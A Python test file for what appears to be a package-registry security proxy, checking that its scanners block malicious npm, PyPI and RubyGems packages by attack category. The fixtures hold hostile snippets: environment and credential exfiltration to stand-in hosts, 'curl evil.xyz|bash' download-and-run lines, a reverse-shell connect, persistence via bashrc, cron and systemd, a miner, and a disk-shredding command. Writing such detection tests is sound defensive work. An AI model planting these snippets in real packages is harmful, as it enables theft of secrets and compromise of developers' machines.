"""Detection category benchmark — industry-standard evaluation.

Maps Guard Proxy's detection against the Backstabber's Knife Collection (BKC)
taxonomy and MITRE ATT&CK supply chain categories.

Categories based on:
- BKC academic dataset (174 malicious packages, 2015-2019)
- MITRE ATT&CK T1195 (Supply Chain Compromise)
- GuardDog/Socket.dev detection categories
- ICSE 2023 "Bad Snakes" benchmark
"""

import shutil
import tempfile
from datetime import UTC, datetime, timedelta
from pathlib import Path

from app.core.config import Settings
from app.decision.engine import DecisionEngine
from app.scanners.ast_scanner import ASTScanner
from app.scanners.base import ScanPipeline
from app.scanners.cooldown import CooldownScanner
from app.scanners.heuristics_scanner import HeuristicsScanner
from app.scanners.ioc_checker import IOCScanner
from app.scanners.metadata_scanner import MetadataScanner
from app.scanners.static_analysis import StaticAnalysisScanner
from app.scanners.static_analysis_pypi import PyPIStaticAnalysisScanner
from app.scanners.static_analysis_rubygems import RubyGemsStaticAnalysisScanner
from app.schemas.package import PackageInfo


def _s():
    return Settings(decision_mode="enforce", cooldown_days=7, cooldown_action="deny")


async def _blocked(reg, files, scripts=None, age=24, name="test-pkg", version="1.0.0"):
    s = _s()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    arts = []
    for fname, content in files.items():
        p = tmp / fname
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(content) if isinstance(content, bytes) else p.write_text(content)
        arts.append(p)
    pkg = PackageInfo(
        name=name,
        version=version,
        registry=reg,
        publish_date=datetime.now(UTC) - timedelta(hours=age),
        install_scripts=scripts or {},
    )
    scanners = {
        "npm": [
            IOCScanner(),
            CooldownScanner(s),
            MetadataScanner(),
            StaticAnalysisScanner(s),
            HeuristicsScanner(),
            ASTScanner(),
        ],
        "pypi": [
            IOCScanner(),
            CooldownScanner(s),
            MetadataScanner(),
            PyPIStaticAnalysisScanner(s),
            HeuristicsScanner(),
            ASTScanner(),
        ],
        "rubygems": [
            IOCScanner(),
            CooldownScanner(s),
            MetadataScanner(),
            RubyGemsStaticAnalysisScanner(s),
            HeuristicsScanner(),
        ],
    }
    results = await ScanPipeline(scanners[reg]).run(pkg, arts)
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    return decision.verdict in ("deny", "quarantine")


# ========================================================================
# Category A: Installation-Time Execution (BKC: 56% of attacks use this)
# ========================================================================


async def test_cat_a1_npm_postinstall():
    assert await _blocked(
        "npm",
        {"s.js": "const d=JSON.stringify(process.env);require('https').get('https://evil.xyz/?d='+d);"},
        {"postinstall": "node s.js"},
    )


async def test_cat_a2_npm_preinstall():
    assert await _blocked(
        "npm",
        {"s.js": "const d=JSON.stringify(process.env);require('https').get('https://evil.xyz/?d='+d);"},
        {"preinstall": "node s.js"},
    )


async def test_cat_a3_pypi_setup_exec():
    assert await _blocked("pypi", {"setup.py": "import os;os.system('curl evil.xyz')"})


async def test_cat_a4_pypi_pth_file():
    assert await _blocked("pypi", {"evil.pth": "import os;os.system('curl evil.xyz')"})


async def test_cat_a5_gem_extconf():
    assert await _blocked("rubygems", {"extconf.rb": "system('curl evil.xyz|bash')"})


# ========================================================================
# Category B: Credential/Secret Access (BKC: 55% exfiltrate data)
# ========================================================================


async def test_cat_b1_env_bulk_npm():
    assert await _blocked(
        "npm",
        {"s.js": "const d=JSON.stringify(process.env);fetch('https://evil.xyz?d='+d);"},
        {"postinstall": "node s.js"},
    )


async def test_cat_b2_ssh_key_npm():
    assert await _blocked(
        "npm",
        {"s.js": "require('fs').readFileSync(require('os').homedir()+'/.ssh/id_rsa');"},
        {"postinstall": "node s.js"},
    )


async def test_cat_b3_aws_creds_pypi():
    assert await _blocked("pypi", {"setup.py": "open('/home/user/.aws/credentials').read()"})


async def test_cat_b4_k8s_secret():
    assert await _blocked(
        "npm",
        {"s.js": "require('fs').readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token');"},
        {"postinstall": "node s.js"},
    )


async def test_cat_b5_cloud_metadata():
    assert await _blocked(
        "pypi", {"setup.py": "import urllib.request;urllib.request.urlopen('http://169.254.169.254/latest/meta-data/')"}
    )


# ========================================================================
# Category C: Network Exfiltration
# ========================================================================


async def test_cat_c1_http_exfil():
    assert await _blocked(
        "npm",
        {
            "s.js": "require('https').get('https://evil.xyz/steal?d='+Buffer.from(JSON.stringify(process.env)).toString('base64'));"
        },
        {"postinstall": "node s.js"},
    )


async def test_cat_c2_dns_exfil():
    assert await _blocked(
        "npm",
        {
            "s.js": "const dns=require('dns');dns.resolve(Buffer.from(JSON.stringify(process.env)).toString('hex')+'.evil.xyz','TXT',()=>{});"
        },
        {"postinstall": "node s.js"},
    )


async def test_cat_c3_webhook_exfil():
    assert await _blocked(
        "npm",
        {"s.js": "fetch('https://discord.com/api/webhooks/123/T',{method:'POST',body:JSON.stringify(process.env)});"},
        {"postinstall": "node s.js"},
    )


async def test_cat_c4_telegram_exfil():
    assert await _blocked(
        "pypi",
        {
            "setup.py": "import os,urllib.request;urllib.request.urlopen('https://api.telegram.org/bot123/sendMessage?text='+str(os.environ))"
        },
    )


# ========================================================================
# Category D: Code Obfuscation (BKC: 49% use obfuscation)
# ========================================================================


async def test_cat_d1_base64_eval():
    assert await _blocked(
        "npm", {"s.js": "eval(Buffer.from('cmVxdWlyZQ==','base64').toString())"}, {"postinstall": "node s.js"}
    )


async def test_cat_d2_charcode():
    assert await _blocked(
        "npm", {"s.js": "String.fromCharCode(101,118,97,108);Function('return eval')();"}, {"postinstall": "node s.js"}
    )


async def test_cat_d3_eval_alias():
    assert await _blocked(
        "npm", {"s.js": 'const e=eval;e(\'require("child_process").exec("id")\');'}, {"postinstall": "node s.js"}
    )


async def test_cat_d4_getattr_python():
    assert await _blocked("pypi", {"setup.py": "x=getattr(__builtins__,'exec');x('import os')"})


async def test_cat_d5_dynamic_require():
    assert await _blocked(
        "npm", {"s.js": "const m='child_'+'process';require(m).exec('id');"}, {"postinstall": "node s.js"}
    )


async def test_cat_d6_xor_cipher():
    assert await _blocked(
        "npm",
        {
            "s.js": "function x(d,k){let r='';for(let i=0;i<d.length;i++)r+=String.fromCharCode(d.charCodeAt(i)^k);return r;}eval(x('\\x1a',5));"
        },
        {"postinstall": "node s.js"},
    )


# ========================================================================
# Category E: Process/System Execution
# ========================================================================


async def test_cat_e1_subprocess_bash():
    assert await _blocked("pypi", {"setup.py": "import subprocess;subprocess.Popen('curl evil.xyz|bash',shell=True)"})


async def test_cat_e2_os_system():
    assert await _blocked("pypi", {"setup.py": "import os;os.system('curl evil.xyz')"})


async def test_cat_e3_ruby_system():
    assert await _blocked("rubygems", {"extconf.rb": "system('curl evil.xyz|bash')"})


async def test_cat_e4_ruby_backtick():
    assert await _blocked("rubygems", {"extconf.rb": "`curl evil.xyz`"})


async def test_cat_e5_reverse_shell():
    assert await _blocked(
        "npm", {"s.js": "const net=require('net');net.connect(4444,'142.11.206.73');"}, {"postinstall": "node s.js"}
    )


# ========================================================================
# Category F: File System Manipulation
# ========================================================================


async def test_cat_f1_bashrc_inject():
    assert await _blocked(
        "npm",
        {"s.js": "require('fs').appendFileSync(require('os').homedir()+'/.bashrc','curl evil.xyz|bash');"},
        {"postinstall": "node s.js"},
    )


async def test_cat_f2_path_hijack():
    assert await _blocked(
        "pypi", {"setup.py": "open('/usr/local/bin/git','w').write('#!/bin/bash\\ncurl evil.xyz|bash')"}
    )


async def test_cat_f3_git_hook():
    assert await _blocked(
        "npm",
        {"s.js": "require('fs').writeFileSync('.git/hooks/pre-push','#!/bin/sh\\ncurl evil.xyz|bash');"},
        {"postinstall": "node s.js"},
    )


# ========================================================================
# Category G: Persistence Mechanisms
# ========================================================================


async def test_cat_g1_crontab():
    assert await _blocked(
        "npm",
        {"s.js": "require('child_process').exec('crontab -l | echo \"* * * * * curl evil.xyz\" | crontab -');"},
        {"postinstall": "node s.js"},
    )


async def test_cat_g2_systemd():
    assert await _blocked(
        "pypi",
        {
            "setup.py": "open('/etc/systemd/system/evil.service','w').write('[Service]\\nExecStart=/bin/bash -c curl evil.xyz')"
        },
    )


async def test_cat_g3_ld_preload():
    assert await _blocked(
        "pypi",
        {"setup.py": "import os;open(os.path.expanduser('~/.bashrc'),'a').write('export LD_PRELOAD=/tmp/evil.so')"},
    )


async def test_cat_g4_sitecustomize():
    assert await _blocked(
        "pypi", {"setup.py": "import site;open(site.getsitepackages()[0]+'/sitecustomize.py','w').write('import os')"}
    )


# ========================================================================
# Category H: Metadata Anomalies (BKC: 61% use typosquatting)
# ========================================================================


async def test_cat_h1_typosquat_npm():
    assert await _blocked(
        "npm", {"s.js": "require('child_process').exec('id');"}, {"postinstall": "node s.js"}, name="lodahs"
    )


async def test_cat_h2_typosquat_pypi():
    assert await _blocked("pypi", {"setup.py": "import os;os.system('id')"}, name="reqeusts")


async def test_cat_h3_ioc_known_package():
    assert await _blocked("npm", {"index.js": "module.exports={}"}, name="axios", age=48, version="1.14.1")


# ========================================================================
# Category I: Advanced/Emerging Techniques
# ========================================================================


async def test_cat_i1_cryptominer():
    assert await _blocked(
        "npm",
        {"s.js": "require('child_process').exec('curl stratum+tcp://pool.minexmr.com|xmrig');"},
        {"postinstall": "node s.js"},
    )


async def test_cat_i2_wasm_binary():
    assert await _blocked(
        "npm",
        {
            "loader.js": "WebAssembly.instantiate(require('fs').readFileSync('./p.wasm'));",
            "p.wasm": b"\x00asm\x01\x00\x00\x00",
        },
        {"postinstall": "node loader.js"},
    )


async def test_cat_i3_timebomb():
    assert await _blocked(
        "npm",
        {"s.js": "setTimeout(()=>{require('child_process').exec('curl evil.xyz')},86400000);"},
        {"postinstall": "node s.js"},
    )


async def test_cat_i4_elf_binary():
    assert await _blocked("npm", {"payload": b"\x7fELF" + b"\x00" * 100}, {"postinstall": "./payload"})


async def test_cat_i5_unicode_steganography():
    assert await _blocked(
        "npm",
        {"s.js": "const x\u200b=require('child_process');x\u200b.exec\u200b('curl evil.xyz');\u200b\u200b\u200b"},
        {"postinstall": "node s.js"},
    )


async def test_cat_i6_procfs_memory_scan():
    assert await _blocked(
        "npm",
        {"s.js": "const fs=require('fs');fs.readFileSync('/proc/'+process.pid+'/maps');"},
        {"postinstall": "node s.js"},
    )


async def test_cat_i7_tunnel_service():
    assert await _blocked(
        "npm",
        {"s.js": "require('child_process').exec('curl https://evil.ngrok.io/shell|bash');"},
        {"postinstall": "node s.js"},
    )


async def test_cat_i8_dead_mans_switch():
    assert await _blocked(
        "npm",
        {
            "s.js": "if(!require('net').connect(4444,'c2.evil.xyz')){require('child_process').exec('find / -exec shred -vfz {} \\\\;');}"
        },
        {"postinstall": "node s.js"},
    )
